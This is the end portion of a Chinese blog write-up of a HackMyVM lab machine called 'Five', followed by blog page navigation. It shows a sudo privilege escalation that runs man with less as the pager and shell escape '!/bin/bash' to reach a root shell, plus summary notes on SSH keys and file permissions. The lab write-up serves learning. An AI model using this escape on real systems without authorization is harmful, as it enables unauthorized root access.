+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="MEL"><figure class="iseeu highlight /mel"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">melisa@five:~$ sudo man man</span><br><span class="line">Your terminal lacks the ability to <span class="keyword">clear</span> the screen or position the cursor.</span><br><span class="line"></span><br><span class="line">man: command exited with status <span class="number">1</span>: sed -e <span class="string">&#x27;/^[[:space:]]*$/&#123; N; /^[[:space:]]*\n[[:space:]]*$/D; &#125;&#x27;</span> | LESS=-ix8RmPm Manual page man(<span class="number">1</span>) ?ltline %lt?L/%L.:byte %bB?s/%s..?e (END):?pB %pB\%.. (press h <span class="keyword">for</span> <span class="keyword">help</span> or q to <span class="keyword">quit</span>)$PM Manual page man(<span class="number">1</span>) ?ltline %lt?L/%L.:byte %bB?s/%s..?e (END):?pB %pB\%.. (press h <span class="keyword">for</span> <span class="keyword">help</span> or q to <span class="keyword">quit</span>)$ MAN_PN=man(<span class="number">1</span>) pager</span><br></pre></td></tr></table></figure></div>
+<p>看了wp，原来是分页的模式不同，要用less分页执行</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="RUBY"><figure class="iseeu highlight /ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">melisa<span class="variable">@five</span><span class="symbol">:~</span><span class="variable">$ </span>sudo /bin/man -P /usr/bin/less man</span><br><span class="line"><span class="variable constant_">WARNING</span>: terminal is <span class="keyword">not</span> fully functional</span><br><span class="line">-  (press <span class="variable constant_">RETURN</span>)!<span class="regexp">//bbiinn</span><span class="regexp">//bbaasshh</span>!<span class="regexp">/bin/bash</span></span><br><span class="line">root<span class="variable">@five</span><span class="symbol">:/home/melisa</span><span class="comment"># </span></span><br></pre></td></tr></table></figure></div>
+<p>这里的意思就相当于用less作为分页器来看man的操作手册 。 -P用于指定分页器</p>
+<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>学习到了如果上传的文件所在目录没有访问权限的时候解决方案-&gt;上传到根目录<br>用私钥生成公钥  以及有cp权限时候的注意事项（自己可以先创建有一个权限的文件）<br>ssh无法登录的原因之一：端口未开放 或者 没有对应的公钥<br>man提权的时候遇到问题，可以指定分页器</p>
+<p>再复习一下 私钥权限是600 公钥权限是644<br>还是收获不少的</p>
+
+    </div>
+
+    
+    
+    
+        
+
+<div>
+<ul class="post-copyright">
+  <li class="post-copyright-author">
+    <strong>本文作者： </strong>guayu-kakeru
+  </li>
+  <li class="post-copyright-link">
+    <strong>本文链接：</strong>
+    <a href="https://guayu-kakeru.github.io/posts/48411.html" title="HMV-Five">https://guayu-kakeru.github.io/posts/48411.html</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" rel="noopener" target="_blank"><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</a> 许可协议。转载请注明出处！
+  </li>
+</ul>
+</div>
+
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/%E6%B8%97%E9%80%8F/" rel="tag"># 渗透</a>
+              <a href="/tags/HMV/" rel="tag"># HMV</a>
+              <a href="/tags/%E9%9D%B6%E5%9C%BA/" rel="tag"># 靶场</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/posts/38113.html" rel="prev" title="SWPUCTF_2022新生赛(web)WP">
+      <i class="fa fa-chevron-left"></i> SWPUCTF_2022新生赛(web)WP
+    </a></div>
+      <div class="post-nav-item"></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F"><span class="nav-text">端口扫描</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#web%E6%8E%A2%E6%B5%8B"><span class="nav-text">web探测</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%8F%90%E6%9D%83"><span class="nav-text">提权</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#www"><span class="nav-text">www</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#melisa"><span class="nav-text">melisa</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%80%BB%E7%BB%93"><span class="nav-text">总结</span></a></li></ol></li></ol></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="guayu-kakeru"
+      src="/images/avatar.jpg">
+  <p class="site-author-name" itemprop="name">guayu-kakeru</p>
+  <div class="site-description" itemprop="description">一年过后，你会希望从今天就开始行动。</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">44</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">9</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">12</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+        <a href="https://github.com/guayukakeru" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;guayukakeru" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="/1806449041@qq.com" title="E-Mail → 1806449041@qq.com"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
+      </span>
+  </div>
+
+
+
+  <div class="links-of-recent-posts motion-element">
+    <div class="links-of-recent-posts-title">
+      <i class="fa fa-history fa-fw"></i>
+      最近文章
+    </div>
+    <ul class="links-of-recent-posts-list">
+        <li class="links-of-recent-posts-item">
+          <a href="/posts/48411.html" title="posts&#x2F;48411.html">HMV-Five</a>
+        </li>
+        <li class="links-of-recent-posts-item">
+          <a href="/posts/38113.html" title="posts&#x2F;38113.html">SWPUCTF_2022新生赛(web)WP</a>
+        </li>
+        <li class="links-of-recent-posts-item">
+          <a href="/posts/50600.html" title="posts&#x2F;50600.html">HMV-insomnia</a>
+        </li>
+        <li class="links-of-recent-posts-item">
+          <a href="/posts/62818.html" title="posts&#x2F;62818.html">寒假总结</a>
+        </li>
+        <li class="links-of-recent-posts-item">
+          <a href="/posts/25446.html" title="posts&#x2F;25446.html">SWPUCTF_2021新生赛(web)WP</a>
+        </li>
+    </ul>
+  </div>
+      </div>
+
+      
+      
+        <div class="links-of-blogroll motion-element links-of-blogroll-undefined">
+          <div class="links-of-blogroll-title">
+            <i class="fa fa-history fa-" aria-hidden="true"></i>
+            
+          </div>
+          <ul class="links-of-blogroll-list">
+            
+            
+              <li class="recent_posts_li">
+                <a href="/" title="" target="_blank"></a>
+              </li>
+            
+              <li class="recent_posts_li">
+                <a href="/" title="" target="_blank"></a>
+              </li>
+            
+              <li class="recent_posts_li">
+                <a href="/" title="" target="_blank"></a>
+              </li>
+            
+              <li class="recent_posts_li">
+                <a href="/" title="" target="_blank"></a>
+              </li>
+            
+              <li class="recent_posts_li">
+                <a href="/" title="" target="_blank"></a>
+              </li>
+            
+          </ul>
+        </div>
+      
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2025</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">guayu-kakeru</span>
+</div>
+
+
+
+        
+<div class="busuanzi-count">
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-user"></i>
+      </span>
+      <span class="site-uv" title="总访客量">
+        <span id="busuanzi_value_site_uv"></span>
+      </span>
+    </span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-eye"></i>
+      </span>
+      <span class="site-pv" title="总访问量">
+        <span id="busuanzi_value_site_pv"></span>
+      </span>
+    </span>
+</div>
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+  
+<script src="/js/local-search.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+</body>
+</html>
